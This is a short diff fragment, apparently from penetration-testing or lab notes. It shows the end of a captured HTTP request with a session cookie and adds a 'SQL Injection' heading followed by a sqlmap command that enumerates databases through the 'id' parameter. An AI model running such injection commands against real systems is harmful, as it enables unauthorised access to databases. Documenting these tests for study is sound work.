@@ -26,8 +26,7 @@ Accept-Encoding: gzip, deflate, br
 Cookie: PHPSESSID=pvm9s24kls26lgqj0730spgclj
 Connection: keep-alive
 
-
-
+## SQL Injection
 Using sqlmap tool:
 1. Enumerate Databases
 python sqlmap.py -r 1 -p id --batch --dbs
